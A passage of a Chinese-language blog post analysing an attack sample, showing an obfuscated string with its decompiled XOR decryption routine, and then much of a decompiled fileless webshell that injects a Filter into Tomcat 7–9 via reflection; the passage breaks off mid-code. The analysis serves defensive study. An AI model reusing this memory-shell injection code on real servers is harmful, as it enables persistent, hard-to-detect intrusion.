N\u0016\u0017\u0015eA-m\u000f\u00168N@&lt;u&amp;09\u0006c&gt;w\u0004g\u0018xOTc\u007f\u001b\u0016\\w&gt;\\\u0014\r(u&#123;\nm\u007f1&lt;q)\u0007B\u0018&#x3D;\u0018n\\%j|%\u0012[t!Y&#x2F;\u0002BIJ1\u0016\b0&#x3D;qu\u0007g\u001c%\u0018\r-&amp;n\u000f!\u0011eN&gt;_,8,&#123;&#123;#i46\rzX\&quot;V&amp;7+Tu.d\u001b-\u000bfA&gt;G\u0002g\u0002W&#123;\tL8\u0004HGq\u0007\u001c\u0003b;nX.u|\u0003Jl^2G\u0014\u0012,FX5n#\u001e?Gh&#x3D;w\u0014&#x3D;6\ra\fM#6\fj*6V&#x2F;\u0002OQV\u001dC\u00034\u0017y+&#x3D;|w&amp;#h,\nc\u007f\u001bJ\\t\bZ\u0014&#x2F;\t&#125;X%u\&quot;6\&quot;iq\u0006g\u0003\u0017;&#125;L\u000b&#123;\t%\u0012[t!Y,\u0012&lt;JC\u001d\u0016\u001e\f\u0017Ou&#x3D;\u001c\u001fb1iv&amp;n\u000f%\u0014eA6&#123;\u0014\r4Ex3\u0016;\u0014+~p&#x2F;l\&quot;\u0018\u001bR_Vv\u00162\f\\+2V*8\u0002S&#125;&#39;\u0016!12mn(\u001f&amp;e\u001ew[0u\u0016\u001b\u0000^N]Z\u0001\&quot;?~Q\t_&amp;1\u0017y-(\u001c\u00009\u0019QC\u0017u\u0016\u0004\f^Q6\u001f-\u0016Cv&#125;,&#125;9\u0000Hic\u0007\u001d\&quot;#\u0018X\\%k\t1\u0016[\\\&quot;\u001f*\u001d0O@\ny~\u000f+zX.F&amp;\u0018\u001bR_Vv\u001dl\tfNQA\u0002d4\u000fz\tC;\u000f\u0000Li0h&gt;&#x3D;\u001eR\\\u0012M\t\u0013\u000fe&#96;]\u007f\u00178\nS@W~y\u0014+~T\u0007\u001d\u0018e+gKTL#9\u0013[A6C\u000f\u0004;QR!W?\f\&quot;eq(\u001d6&#x3D;\u0018Rz\u0012z&#125;\u0007\u0003^NQA\u0001e\u0002N@&lt;u&amp;\u0019HGq\u0006B-#.\rS\u0015u\u0019\u001bJp&#96;\bx\u000f\u0004;sCVy~\u0006-\nc\u0000h\b #\rL&amp;n\r&gt;\u0015k^\u0014G*8?I&#123;#i;\u000f\u0003\u0006M\u0000g\u0004%\u0018RzSd\u001b-\u000bfA&gt;G+\u0016CUz\nC91&#x3D;\u0007o5\u001d\&quot;\&quot;\u001bxO\u001d&#96;9\u0010;&#125;t\&quot;X-\u0012,JC%j\u000f\u0019)WT\u0005B\bg#l \u0017v\u0019&#96;\u0014s)]F&#x2F;8,U&#125; \\&gt;\u0001&#x3D;Oq\u0000B\u000b#\u0018x_\u0011u7l.[Q._,8\u001e|&#125;3C&#x3D;\u000f&#x3D;i&#96;+X\u000b\u00146lq)N#\u0013HfJ]\\\u0017\u0002OQUUa~6\u0017Sl&gt;U&#x3D;%.xi\fK#\u0010\f]^\&quot;Z\u0014,Ck&#125;,e&gt;7\u0017[Z\u0000x\&quot;&amp; xO\u001d&#96;9\u0010;|Q6Y\u001bf(Fx3\u001a \u0014+~L&#x2F;l\&quot;\u0018\u001bR_Vv\u001dl\tfNQA\u0002d4\u000fz\tC;\u000f\u0000L[%n&amp;; gK&#39;J\u0016\u0007\u0016\\n!n\f\u0016\u001dONTf\f\u00148\\v3\u001f\u0004\u0018\u001bR_Vv\u001dl\tfNQA\u0002d4\u000fz\tC;\u000f\u0000Li2H\u000b\u0014&lt;Fq.&#123;\t%\u0012[t!Y-g,U&#125;&lt;e&gt;12To7\u001d\u0018&#96;5Fu3n\u001f\u00145e+2\u001f\u001d\u0002OH&#125;&lt;&#125;\u001a12uu&#x3D;x~\u0017;|H\u000bd\u001b-\u000bfA&gt;G+\u0016CEC&lt;e|7&#x3D;i)(\u001e\u00009\u0019QC\u0017u\u0016\u00070]w&amp;\u001e*\u00134\u000fz\ty&amp;7.L[%n\u001c, h_\u000fn\u001f\u0014&gt;tZ\be\u000f\u0004;y&#125;We&gt;1&#x3D;j[%n\u001f:)lu3n\u001f\u00143e+2\u001f\u001fg\u0002WzWb\f\u00148rv&#x2F;z6$#gC\fc|-\u0012]t\u0007Y\u001fg\u0002WzWby\u0014+~I\u0005B\bg#l \u0017v\u0019&#96;\u0014s)*\\\u0017\r4EX5n\u0001\u000fHi)5\u001d6&#x3D;\u0019\fW)M|\u0013\u0011eA-m\u000f\u0017\u0011PR1W?\f\&quot;eq(\u001d6&#x3D;\u0018Rz\u0012~|-\u0012\\**b,g&lt;TC&lt;fy\u0014+~U\u0000hw\u0016\u001fgK\b~\u0016\u001f\u0003fA\u000fm\u000f\u0014&#x2F;PNTf&gt;\u0003\u001dzX h\u001c9#\r \u000fu\u001b\u001fKet&gt;C-2?~_\rG\u00034\u0017y+&#x3D;|w&amp;#h,\nc\u007f\u001bJ\\t\bZ\u0014&#x2F;\tONTf\f\u0014;[r\u0006\u001f\u0014%\u0018R_\u0017n\u001f\u0014&#x3D;t_\u0010l\u0005\u0003\u000e|X5n\u00027\u0017i*7x&#123;&#x2F;\u001ex_\u0011v|\u00008~[5@\u0005\u0000\u0002N@&lt;u&amp;\u0019HGq\u0006B-#.\rS\u0015u\u0019\u001bJpn!n\u001f\u0016\u0012rx\ti|\f\&quot;Xo\u0007\u001d\u0018,\u001eRa\bK\rl.eA.\u001d,\u0012,\u000fL\ty61-ic\u0000k:\u0018\u001bR_Vv\u00162\f\\+2V*8\u0002S&#125;&#39;\u0016\u001a\u000f\&quot;u+\u0006h\u0018e&#x2F;RO\u001eL\tl\u000f\\+1\u0018\u0005\u0003#~P5n)\u0014&gt;zX%~\u000f,;~X%m)\u00148~])n\u0000\u0014;&#125;X z\u000f\u0014;~q%n\u000b\u0014;nX%n\u000f\u0000\u000bKn%m&#x3D;\u0004;~X%j\u000f\u001b\u001d~X%n!\u0014;XX%n\f\u0004;&#125;X%y\u000f\u0014?~T\u0013n&#125;\u0014;zX*~\u000f\u0014;|P%n)\u00149~X%n\f&lt;\u0015Mm\u0013n\r&amp;+~X%n\u000b\u00144XX%n\u000f:;~~%n\u000f\u0017\u001d~[5n\u0014\u0014;zX+n\u000f&#96;;~\\%a\u001f\u0014;~Z!n\f\u0014;|X%n\u000f\u0016)Pk%V;~\u000eHX \\\u000f\u0014;~X!n\u00002;~X%v\u000f\u0014+~X%m9\u0014;nXRn\n&amp;;~~%\u001e\u000f\u0014;~^5n\u000f\u0014;vX%n\u000f\u0017\tnX%n\u000f\u0010;q~%n\u000f\u0014#~X5n\u000f\u00149~X4n\u000f\u0014;~H%n\u001f\u0014C~X!n\u001e2;\u0010X%f\u000f\u001b+~X%J\u0003\u00148HX&#x2F;n\u000f\u00148|p\u0012n\u000f\u0014+\t[&#39;U\u000f\u0014;j&#x2F;&amp;&#125;%\u0010?XxQn\u000f69~T&#x3D;ny\u0017\u0011z\\\u0003N&#123;\u0014;\\Z%m\u0007\u001c\u000eXX.B\u001f\u0011\u0018xH7\u001a\u000f\u0014\u0015&#125;X&amp;f\u0002 +~T%H\n\u001d;&#125;T&gt;m\u0002&gt;;|~!n\u000b2\tl]\u0006D\u000f\u0011\u001drX!Hea;&#125;XRm6&gt;2&#125;&#123;\u0017n\u000b\u0003\u0017\bX&amp;e\u0014!\r~M#~\u001d&#96;;~v&amp;n\f\u001c6JH%b\u000f29\rX&amp;~\u001d\u0013\u0018fX\&quot;]\u0017\u0014&lt;\b@%h\f\u001c*Kn%u:2;^^5|&#123;\u00148L[%k!\u001c\u000fHX\u0007x,6;wM\u000be\t\u0004\u0013\rX&amp;\u001a\u0014\u001b\u001dfZ\nX\u000f\u001b&#x3D;nr2m&lt;\f;w&#x2F;\u0002\u0000y7\t~P\&quot;D?!\u001d~q\u0010H\u000f&lt;\u000eHX\u000eh\u001f0M~Z6u:\&quot;;Sl\u0013n#\u0002(TS\u0010H\u000f;\u000eHX\u000b[)\u0014\nK~%^:2;Mm\u0003n&#x3D;\u0017\u0018\u000fX(y%\u0011&#x3D;nJQn\u000f:8~_*u\f\u0017\u0011yLSv\u000f\u0019\u0016Zw%m)c8V)\u0016c\u0002&gt;;rX)n&gt;\&quot;;sU7\\&#x3D; +~n%X\r-;~\\%d\u001f\u0011\u0002~I5n\u0002\&quot;;|X v\u000f\u0014;&#125;R%m\u0007\u0014;~X\u000en\u000f\f;uX%b\u000f\u0016&#x2F;~R5n!\u0014&gt;PX&#x2F;~\f\u001e;|j%z\u001f\u0014\t~P)n\u0002\u00049rX&#39;\u001b\u000f9+~o%d\u000b\u00147~Z\u0016n\n\u001c;\u0007H%\u001e\u000f\u0005+~T\u0013k|\u0014&gt;nXKH\u000fd;n\\%a9\u00100~]\u000fn\u001f\u0014;~X#\u0017\u000f\u0017\f\u000fX7H-\u0014+nz%~8m;l~%d\f\&quot;8&#123;[\u0013m\u000b\u0017\r&#125;_&amp;X\f\u00128H[&amp;m9\u00179~X\u0007n\u001c\&quot;\u0019~J%L\u000f\u0006+~XKX\u000f\u0003;~v,n\u000b\u00182~\\5g\u000f\u0010&#x2F;wX!v\u0006\u0014?zQ%j\u0007\u00178H[,m9\u00173&#125;n&amp;e\u000f\u0014&gt;\u0010X!H\u000f\u0017\u001d\\X5X-\u0014(~z%&#125;\u001f6;m~\u0007n\u001f\u0004\u0019~H\u0003n\f\u0017\r&#125;R n-\u0014*~X%n\u000f\f;~~&amp;c\u000f\u0011J~X5m\u0003\u0014&gt;nX%~\u000fd;~X%h\u001f\u0014;~X!n\u000f\u0014;&#125;j5n\u000f\u0014;zX*H\u000f\u0014;~@%n\u001f\u0014;~]\u0013n\u000f\u00048qX%n\u000f\u0014\u001d&#125;V\n\u001dZm,N 1\u0016Zk\u0003\bZh\u000e\u0010^o\u0005\u0001&#39;:TKt\u0014K&#39;&#39;$\u0015M~JN&gt;4\u0019W|JL&#x2F;!\u001bSp\nN&#96;1\u001fOu\u000bV&#96;\u0013\u0013Sm\u0001]\u00034\n\t\tZm\&quot;F\&quot;!\u001fM\n\u001dZm&#39;@ !\u001fGm\u0006\u000eWp\u0017\u000b~\r\tZm\&quot;F\&quot;!\u001fMW\u0005B+\&quot;\u0015M~JN&gt;4\u0019W|JL!,\u0015K|J&#125;+$\u000fZj\u0010h&lt;:\u000fOP\nI!\r\u001cVu\u0010J&lt;\u0016\u0015Q\u007f\rH&#x3D;\u0015\u0010^o\u0005\u0001\&quot;4\u0014X70G&lt;0\u001b[^\u0016@;%\u0007\u000eWk\u0001N*&amp;\n\u001cVu\u0010J&lt;\u0018\u001bOj\u001d\u0015M~JN&gt;4\u0019W|JL!,\u0015K|J&#125;+$\u000fZj\u0010f 3\u0015(\u0015M~JN&gt;4\u0019W|JL&#x2F;!\u001bSp\nN&#96;6\u0015M|J|:4\u0014[x\u0016K\r:\u0014K|\u001c[0\u0015M~JN&gt;4\u0019W|JL&#x2F;!\u001bSp\nN&#96;6\u0015M|Jn&gt;%\u0016Vz\u0005[&#39;:\u0014yp\b[+&#39;9Pw\u0002F)\u000b\u0013Qj\u0001]:\u0005\u0015Vw\u0010\u0007\u0016Px\u0000J&lt;&amp;\u0012\u001b[&#125;\&quot;F\&quot;!\u001fMT\u0005_\f0\u001cPk\u0001\u000b\u001eZ\u007f\rA+\u0016\u0016^j\u0017\t\u001dZm#C!7\u001bS\u0004\u0012Km\u0014 \tJwJB&#39;&amp;\u0019\u0011L6c\r9\u001bLj4N:&#x3D;^yp\bJ\u0002:\u001b[|\u0016\n\u001dZm J-:\u001eZk\u0010\u0010^o\u0005\u0001\&quot;4\u0014X70G&lt;0\u001b[\r\u001b[&#125;1&#125;\u0002\u0005\u001bKm\u0001] \u001b\u0015M~JN&gt;4\u0019W|JL&#x2F;!\u001bSp\nN&#96;\u0016\u0015Qm\u0001W:\n\nMv\u0007J&#x3D;&amp;\u0015Mj\u001a\u0015M~JN&gt;4\u0019W|J[!8\u0019^mJZ:&lt;\u0016\u0011w\u0001[\u0006\u001dSv\u0006N\&quot;&quot;).length();</span><br><span class="line">        int n3 &#x3D; 16;</span><br><span class="line">        int n4 &#x3D; -1;</span><br><span class="line">    Label_0029:</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            while (true) &#123;</span><br><span class="line">                ++n4;</span><br><span class="line">                final String s2 &#x3D; s;</span><br><span class="line">                final int n5 &#x3D; n4;</span><br><span class="line">                String s3 &#x3D; s2.substring(n5, n5 + n3);</span><br><span class="line">                int n6 &#x3D; -1;</span><br><span class="line">                while (true) &#123;</span><br><span class="line">                    final char[] charArray &#x3D; s3.toCharArray();</span><br><span class="line">                    int length;</span><br><span class="line">                    int n8;</span><br><span class="line">                    final int n7 &#x3D; n8 &#x3D; (length &#x3D; charArray.length);</span><br><span class="line">                    int n9 &#x3D; 0;</span><br><span class="line">                    while (true) &#123;</span><br><span class="line">                        Label_0248: &#123;</span><br><span class="line">                            if (n7 &gt; 1) &#123;</span><br><span class="line">                                break Label_0248;</span><br><span class="line">                            &#125;</span><br><span class="line">                            length &#x3D; (n8 &#x3D; n9);</span><br><span class="line">                            do &#123;</span><br><span class="line">                                final char c &#x3D; charArray[n8];</span><br><span class="line">                                char c2 &#x3D; &#39;\0&#39;;</span><br><span class="line">                                switch (n9 % 7) &#123;</span><br><span class="line">                                    case 0: &#123;</span><br><span class="line">                                        c2 &#x3D; &#39;z&#39;;</span><br><span class="line">                                        break;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    case 1: &#123;</span><br><span class="line">                                        c2 &#x3D; &#39;?&#39;;</span><br><span class="line">                                        break;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    case 2: &#123;</span><br><span class="line">                                        c2 &#x3D; &#39;\u0019&#39;;</span><br><span class="line">                                        break;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    case 3: &#123;</span><br><span class="line">                                        c2 &#x3D; &#39;d&#39;;</span><br><span class="line">                                        break;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    case 4: &#123;</span><br><span class="line">                                        c2 &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">                                        break;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    case 5: &#123;</span><br><span class="line">                                        c2 &#x3D; &#39;N&#39;;</span><br><span class="line">                                        break;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    default: &#123;</span><br><span class="line">                                        c2 &#x3D; &#39;U&#39;;</span><br><span class="line">                                        break;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                charArray[length] &#x3D; (char)(c ^ c2);</span><br><span class="line">                                ++n9;</span><br><span class="line">                            &#125; while (n7 &#x3D;&#x3D; 0);</span><br><span class="line">                        &#125;</span><br><span class="line">                        if (n7 &gt; n9) &#123;</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                    final String intern &#x3D; new String(charArray).intern();</span><br><span class="line">                    switch (n6) &#123;</span><br><span class="line">                        default: &#123;</span><br><span class="line">                            array[n++] &#x3D; intern;</span><br><span class="line">                            if ((n4 +&#x3D; n3) &lt; n2) &#123;</span><br><span class="line">                                n3 &#x3D; s.charAt(n4);</span><br><span class="line">                                continue Label_0029;</span><br><span class="line">                            &#125;</span><br><span class="line">                            n2 &#x3D; (s &#x3D; &quot;\u000f\\i\u0015\u0010^o\u0005\u0001\&quot;4\u0014X7&#39;C&#x2F;&amp;\tsv\u0005K+&#39;&quot;).length();</span><br><span class="line">                            n3 &#x3D; 3;</span><br><span class="line">                            n4 &#x3D; -1;</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                        case 0: &#123;</span><br><span class="line">                            array[n++] &#x3D; intern;</span><br><span class="line">                            if ((n4 +&#x3D; n3) &lt; n2) &#123;</span><br><span class="line">                                n3 &#x3D; s.charAt(n4);</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                            break Label_0029;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ++n4;</span><br><span class="line">                    final String s4 &#x3D; s;</span><br><span class="line">                    final int n10 &#x3D; n4;</span><br><span class="line">                    s3 &#x3D; s4.substring(n10, n10 + n3);</span><br><span class="line">                    n6 &#x3D; 0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        final String[] array2 &#x3D; array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反编译出来的代码本身是有问题的，稍微修改一下然后动态调试，发现进入了一个死循环，把下面这个条件判断取消就可以了。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/3.png" alt=""></p>
<p>解密成功。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/4.png" alt=""></p>
<h2 id="0x4-无文件Webshell分析"><a href="#0x4-无文件Webshell分析" class="headerlink" title="0x4 无文件Webshell分析"></a>0x4 无文件Webshell分析</h2><p>同样的，反编译出来的无文件Webshell实现部分的代码也是有问题的。上面解密出来后，把array2数组替换回无文件Webshell实现代码部分，发现是实现了基于Tomcat 7、8、9的动态注册Filter方式的无文件WebShell,大致代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    final Thread currentThread &#x3D; Thread.currentThread();</span><br><span class="line">    final ClassLoader parent &#x3D; currentThread.getContextClassLoader().getParent();</span><br><span class="line">    final Class&lt;?&gt; loadClass &#x3D; parent.loadClass(&quot;java.lang.Thread&quot;);</span><br><span class="line">    final Class&lt;?&gt; loadClass2 &#x3D; parent.loadClass(&quot;java.lang.ThreadGroup&quot;);</span><br><span class="line">    final Class&lt;?&gt; loadClass3 &#x3D; parent.loadClass(&quot;org.apache.coyote.RequestInfo&quot;);</span><br><span class="line">    final Class&lt;?&gt; loadClass4 &#x3D; parent.loadClass(&quot;org.apache.coyote.RequestGroupInfo&quot;);</span><br><span class="line">    final Field declaredField &#x3D; loadClass2.getDeclaredField(&quot;threads&quot;);</span><br><span class="line">    declaredField.setAccessible(true);</span><br><span class="line">    final Field declaredField2 &#x3D; loadClass.getDeclaredField(&quot;target&quot;);</span><br><span class="line">    declaredField2.setAccessible(true);</span><br><span class="line">    final Thread[] array3 &#x3D; (Thread[])declaredField.get(currentThread.getThreadGroup());</span><br><span class="line">    boolean b &#x3D; false;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; array3.length; ++i) &#123;</span><br><span class="line">        final Thread thread &#x3D; array3[i];</span><br><span class="line">        try &#123;</span><br><span class="line">            if (thread &#x3D;&#x3D; null || !thread.getName().contains(&quot;http&quot;)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (NoSuchMethodException ex) &#123;</span><br><span class="line">            throw ex;</span><br><span class="line">        &#125;</span><br><span class="line">        final Object value &#x3D; declaredField2.get(thread);</span><br><span class="line">        try &#123;</span><br><span class="line">            if (value &#x3D;&#x3D; null) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (NoSuchMethodException ex2) &#123;</span><br><span class="line">            throw ex2;</span><br><span class="line">        &#125;</span><br><span class="line">        Label_0505: &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (!value.getClass().getName().contains(&quot;Endpoint$&quot;)) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                final Object o &#x3D; value;</span><br><span class="line">                final Class&lt;?&gt; clazz &#x3D; o.getClass();</span><br><span class="line">                final Package package1 &#x3D; clazz.getPackage();</span><br><span class="line">                final String s5 &#x3D; package1.getName();</span><br><span class="line">                final String[] array4 &#x3D; array2;</span><br><span class="line">                final int n11 &#x3D; 51;</span><br><span class="line">                final String s6 &#x3D; &quot;org.apache.tomcat.util.net&quot;;</span><br><span class="line">                final boolean b2 &#x3D; s5.equals(s6);</span><br><span class="line">                if (!b2) &#123;</span><br><span class="line">                    break Label_0505;</span><br><span class="line">                &#125;</span><br><span class="line">                break Label_0505;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (NoSuchMethodException ex3) &#123;</span><br><span class="line">                throw ex3;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                final Object o &#x3D; value;</span><br><span class="line">                final Class&lt;?&gt; clazz &#x3D; o.getClass();</span><br><span class="line">                final Package package1 &#x3D; clazz.getPackage();</span><br><span class="line">                final String s5 &#x3D; package1.getName();</span><br><span class="line">                final String[] array4 &#x3D; array2;</span><br><span class="line">                final int n11 &#x3D; 51;</span><br><span class="line">                final String s6 &#x3D; &quot;org.apache.tomcat.util.net&quot;;</span><br><span class="line">                final boolean b2 &#x3D; s5.equals(s6);</span><br><span class="line">                if (!b2) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (NoSuchMethodException ex4) &#123;</span><br><span class="line">                throw ex4;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        final Field declaredField3 &#x3D; value.getClass().getDeclaredField(&quot;this$0&quot;);</span><br><span class="line">        declaredField3.setAccessible(true);</span><br><span class="line">        final Object value2 &#x3D; declaredField3.get(value);</span><br><span class="line">        final Object invoke &#x3D; value2.getClass().getMethod(&quot;getHandler&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(value2, new Object[0]);</span><br><span class="line">        Object o2;</span><br><span class="line">        try &#123;</span><br><span class="line">            o2 &#x3D; invoke.getClass().getMethod(&quot;getGlobal&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(invoke, new Object[0]);</span><br><span class="line">        &#125;</span><br><span class="line">        catch (NoSuchMethodException ex10) &#123;</span><br><span class="line">            final Field declaredField4 &#x3D; invoke.getClass().getDeclaredField(&quot;global&quot;);</span><br><span class="line">            declaredField4.setAccessible(true);</span><br><span class="line">            o2 &#x3D; declaredField4.get(invoke);</span><br><span class="line">        &#125;</span><br><span class="line">        final Field declaredField5 &#x3D; loadClass4.getDeclaredField(&quot;processors&quot;);</span><br><span class="line">        declaredField5.setAccessible(true);</span><br><span class="line">        final ArrayList list &#x3D; (ArrayList)((ArrayList)declaredField5.get(o2)).clone();</span><br><span class="line">        for (int j &#x3D; 0; j &lt; list.size(); ++j) &#123;</span><br><span class="line">            final Object value3 &#x3D; list.get(j);</span><br><span class="line">            if (value3 !&#x3D; null) &#123;</span><br><span class="line">                final String s7 &#x3D; (String)loadClass3.getMethod(&quot;getWorkerThreadName&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(value3, new Object[0]);</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (s7 &#x3D;&#x3D; null || !s7.equals(Thread.currentThread().getName())) &#123;</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                catch (NoSuchMethodException ex5) &#123;</span><br><span class="line">                    throw ex5;</span><br><span class="line">                &#125;</span><br><span class="line">                final Field declaredField6 &#x3D; loadClass3.getDeclaredField(&quot;req&quot;);</span><br><span class="line">                declaredField6.setAccessible(true);</span><br><span class="line">                final Object value4 &#x3D; declaredField6.get(value3);</span><br><span class="line">                final Object invoke2 &#x3D; value4.getClass().getMethod(&quot;getNote&quot;, Integer.TYPE).invoke(value4, 1);</span><br><span class="line">                final Object invoke3 &#x3D; invoke2.getClass().getMethod(&quot;getContext&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(invoke2, new Object[0]);</span><br><span class="line">                final Class&lt;?&gt; 